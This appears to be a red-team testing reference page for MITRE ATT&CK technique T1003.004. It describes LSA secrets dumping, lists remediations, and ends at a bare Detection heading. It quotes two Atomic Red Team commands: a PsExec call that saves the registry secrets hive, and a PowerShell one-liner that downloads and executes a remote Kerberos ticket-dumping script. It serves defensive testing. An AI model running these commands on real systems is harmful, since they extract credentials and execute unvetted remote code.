# T1003.004 LSA Secrets

> **Sub-technique of:** T1003

## High-Level Description

Adversaries with SYSTEM access to a host may attempt to access Local Security Authority (LSA) secrets, which can contain a variety of different credential materials, such as credentials for service accounts. LSA secrets are stored in the registry at <code>HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets</code>. LSA secrets can also be dumped from memory.

Reg can be used to extract from the Registry. Mimikatz can be used to extract secrets from memory.

## Kill Chain Phase

- Credential Access (TA0006)

**Platforms:** Windows

## What to Check

- [ ] Identify if LSA Secrets technique is applicable to target environment
- [ ] Check Windows systems for indicators of LSA Secrets
- [ ] Verify mitigations are bypassed or absent (3 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: Dumping LSA Secrets

Dump secrets key from Windows registry
When successful, the dumped file will be written to $env:Temp\secrets.
Attackers may use the secrets key to assist with extracting passwords and enumerating other sensitive system information.

**Supported Platforms:** windows
**Elevation Required:** Yes

```cmd
"#{psexec_exe}" -accepteula -s reg save HKLM\security\policy\secrets %temp%\secrets /y
```

**Dependencies:**

- PsExec from Sysinternals must exist on disk at specified location (#{psexec_exe})

### Atomic Test 2: Dump Kerberos Tickets from LSA using dumper.ps1

This tool allows you to dump Kerberos tickets from the LSA cache. Implemented via Add-Type.
If the tool is run as a privileged user, it will automatically obtain NT AUTHORITY\SYSTEM privileges and then dump all tickets. If the tool is run as a non-privileged user, it will only dump tickets from the current logon session.

Author of dumper.ps1: Michael Zhmaylo (@MzHmO)

**Supported Platforms:** windows
**Elevation Required:** Yes

```powershell
Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/MzHmO/PowershellKerberos/beed52acda37fc531ef0cb4df3fc2eb63a74bbb8/dumper.ps1')
```

### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to LSA Secrets by examining the target platforms (Windows).

2. **Assess Existing Defenses**: Review whether mitigations for T1003.004 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1027 Password Policies

Ensure that local administrator accounts have complex, unique passwords across all systems on the network.

### M1026 Privileged Account Management

Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers.

### M1017 User Training

Limit credential overlap across accounts and systems by training users and administrators not to use the same password for multiple accounts.

## Detection

### Detection of LSA Secrets Dumping via Registry and Memory Extraction
